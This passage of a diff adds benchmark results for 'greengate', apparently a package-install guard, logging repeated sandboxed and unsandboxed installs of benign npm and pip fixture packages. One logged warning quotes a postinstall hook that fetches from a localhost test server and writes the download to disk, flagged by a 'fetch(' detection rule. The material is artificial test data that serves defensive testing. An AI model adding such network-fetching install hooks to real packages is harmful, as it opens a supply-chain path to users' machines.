filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.33
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "nothing to look up",
+          "exit_code": 0,
+          "seconds": 0.63,
+          "effect": false,
+          "works": true,
+          "status": "passed",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 210ms\n\u2139\ufe0f  Running install scripts of prebuilt-dl@1.0.0...\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SuspiciousScript] prebuilt-dl@1.0.0 \u2014 postinstall: `node -e \"fetch('http://127.0.0.1:34107/prebuilt/bin').then(r=>r.text()).then(t=>require('fs').writeFileSync('bin.txt',t))\"` \u2014 fetch( \u2014 runs because it is allowlisted\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: prebuilt-dl@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n"
+        }
+      ]
+    },
+    {
+      "id": "npm-native-build",
+      "label": "benign",
+      "eco": "npm",
+      "description": "A postinstall compiles and runs a C helper with cc (node-gyp-style native build)",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.61,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 212ms\n\u2139\ufe0f  Running install scripts of native-addon@1.0.0...\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: native-addon@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.29
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.6,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 211ms\n\u2139\ufe0f  Running install scripts of native-addon@1.0.0...\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: native-addon@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.29
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.6,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 208ms\n\u2139\ufe0f  Running install scripts of native-addon@1.0.0...\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: native-addon@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.3
+          }
+        ],
+        "none": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.63,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 212ms\n\u2139\ufe0f  Running install scripts of native-addon@1.0.0...\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: native-addon@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.29
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.6,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 209ms\n\u2139\ufe0f  Running install scripts of native-addon@1.0.0...\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: native-addon@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.3
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.6,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 207ms\n\u2139\ufe0f  Running install scripts of native-addon@1.0.0...\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: native-addon@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.29
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "nothing to look up",
+          "exit_code": 0,
+          "seconds": 0.6,
+          "effect": false,
+          "works": true,
+          "status": "passed",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 206ms\n\u2139\ufe0f  Running install scripts of native-addon@1.0.0...\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 1 package(s) run install scripts: native-addon@1.0.0\n  install:execute \u2014 1 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+        }
+      ]
+    },
+    {
+      "id": "npm-plain",
+      "label": "benign",
+      "eco": "npm",
+      "description": "A package with no install scripts",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.27,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 212ms\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 0 package(s) run install scripts\n  install:execute \u2014 0 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.25
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.26,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 206ms\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 0 package(s) run install scripts\n  install:execute \u2014 0 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.26
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.26,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 207ms\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 0 package(s) run install scripts\n  install:execute \u2014 0 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.26
+          }
+        ],
+        "none": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.26,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 208ms\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 0 package(s) run install scripts\n  install:execute \u2014 0 package(s) ran install scripts; not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.26
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.26,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 206ms\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 0 package(s) run install scripts\n  install:execute \u2014 0 package(s) ran install scripts; not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.26
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.27,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 213ms\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 0 package(s) run install scripts\n  install:execute \u2014 0 package(s) ran install scripts; not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.27
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "nothing to look up",
+          "exit_code": 0,
+          "seconds": 0.26,
+          "effect": false,
+          "works": true,
+          "status": "passed",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving the full dependency tree (no package code runs)...\n\u2705 deps check: no policy violations (0 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading and extracting with every install script off...\n\nadded 1 package in 206ms\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:verify-artifacts \u2014 the package manager verified every tarball against the lockfile integrity; 1 installed package(s) checked against the plan\n  install:inspect \u2014 0 package(s) run install scripts\n  install:execute \u2014 0 package(s) ran install scripts; bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, no network\n\u2705 greengate install: done.\n"
+        }
+      ]
+    },
+    {
+      "id": "pip-native-wheel",
+      "label": "benign",
+      "eco": "pip",
+      "description": "A wheel with a cc-compiled native library (loaded with ctypes)",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.79,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-84945-1791818645624149037/dl/nativewheel-1.0.0-py3-none-linux_x86_64.whl\nInstalling collected packages: nativewheel\nSuccessfully installed nativewheel-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.3
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.79,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-85029-1791818650637553321/dl/nativewheel-1.0.0-py3-none-linux_x86_64.whl\nInstalling collected packages: nativewheel\nSuccessfully installed nativewheel-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.31
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.79,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-85123-1791818655728287952/dl/nativewheel-1.0.0-py3-none-linux_x86_64.whl\nInstalling collected packages: nativewheel\nSuccessfully installed nativewheel-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.32
+          }
+        ],
+        "none": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.81,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-85238-1791818660911515418/dl/nativewheel-1.0.0-py3-none-linux_x86_64.whl\nInstalling collected packages: nativewheel\nSuccessfully installed nativewheel-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.31
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.82,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-85377-1791818666113427373/dl/nativewheel-1.0.0-py3-none-linux_x86_64.whl\nInstalling collected packages: nativewheel\nSuccessfully installed nativewheel-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.3
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 0.81,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-85496-1791818671238326694/dl/nativewheel-1.0.0-py3-none-linux_x86_64.whl\nInstalling collected packages: nativewheel\nSuccessfully installed nativewheel-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 0 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 0 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.31
+          }
+        ]
+      },
+      "metadata_down": [
+        {
+          "outcome": "incomplete",
+          "exit_code": 3,
+          "seconds": 0.53,
+          "effect": false,
+          "works": false,
+          "status": "incomplete",
+          "rules": [],
+          "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\n\u26a0\ufe0f  install: 2 check(s) did not complete \u2014 this is not a pass:\n  [INCOMPLETE] registry-metadata \u2014 1 release(s) not checked: nativewheel@1.0.0: http://127.0.0.1:59417/pypi/nativewheel/json: http://127.0.0.1:59417/pypi/nativewheel/json: Connection Failed: Connect error: Connection refused (os error 111)\n  [INCOMPLETE] osv-db:PyPI \u2014 OSV API failed (Failed to reach OSV API \u2014 check your network connection: http://127.0.0.1:59417/v1/querybatch: Connection Failed: Connect error: Connection refused (os error 111): Connection refused (os error 111)) and no offline snapshot \u2014 1 package(s) not checked; run `greengate db update`\n\u26a0\ufe0f  Not every check finished, and an unchecked dependency is not a safe one (`--allow-incomplete` or [policy] on_incomplete = \"warn\" continues anyway).\nInstall halted at the plan: nothing was installed.\n"
+        }
+      ]
+    },
+    {
+      "id": "pip-sdist",
+      "label": "benign",
+      "eco": "pip",
+      "description": "An sdist with an ordinary in-tree build backend",
+      "modes": {
+        "bwrap": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 1.4,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building goodbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-85658-1791818679172391921/built/goodbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: goodbuild\nSuccessfully installed goodbuild-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.47
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 1.37,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building goodbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-85774-1791818685086604462/built/goodbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: goodbuild\nSuccessfully installed goodbuild-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.47
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 1.36,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building goodbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-85886-1791818690886417336/built/goodbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: goodbuild\nSuccessfully installed goodbuild-1.0.0\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 bubblewrap: read-only system, private home and /tmp, project secrets masked, writes confined, network allowed\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.49
+          }
+        ],
+        "none": [
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 1.36,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building goodbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-85997-1791818696779906711/built/goodbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: goodbuild\nSuccessfully installed goodbuild-1.0.0\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SourceBuild] goodbuild==1.0.0 \u2014 resolving these sdists ran their build backends without isolation\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.51
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 1.47,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
+            "output": "\u2139\ufe0f  Loaded config from .greengate.toml\n\u2139\ufe0f  Plan: resolving with `pip install --dry-run` (sdist metadata builds run isolated)...\n\u2705 deps check: no policy violations (1 release(s) checked against the registry).\n\u2139\ufe0f  Fetch: downloading 1 artifact(s) and checking their hashes...\n\u2139\ufe0f  Building goodbuild==1.0.0 from source...\n\u2139\ufe0f  Install: 1 wheel(s), no package code runs...\nProcessing /tmp/greengate-install-86191-1791818702878341598/built/goodbuild-1.0.0-py3-none-any.whl\nInstalling collected packages: goodbuild\nSuccessfully installed goodbuild-1.0.0\n\u26a0\ufe0f  Install-time warnings:\n  [INSTALL/SourceBuild] goodbuild==1.0.0 \u2014 resolving these sdists ran their build backends without isolation\n  install:plan \u2014 1 package(s) planned; release checks cover packages this install adds or changes\n  install:fetch \u2014 1 artifact(s) downloaded by greengate and checked against the index's sha256\n  install:inspect \u2014 1 sdist(s) to build; 0 package(s) with startup (.pth) code\n  install:execute \u2014 1 wheel(s) installed; 1 sdist(s) built \u2014 not isolated: allowlisted environment, filesystem verified afterwards\n\u2705 greengate install: done.\n",
+            "plain_seconds": 0.47
+          },
+          {
+            "outcome": "permitted",
+            "exit_code": 0,
+            "seconds": 1.49,
+            "effect": false,
+            "works": true,
+            "status": "passed",
+            "rules": [],
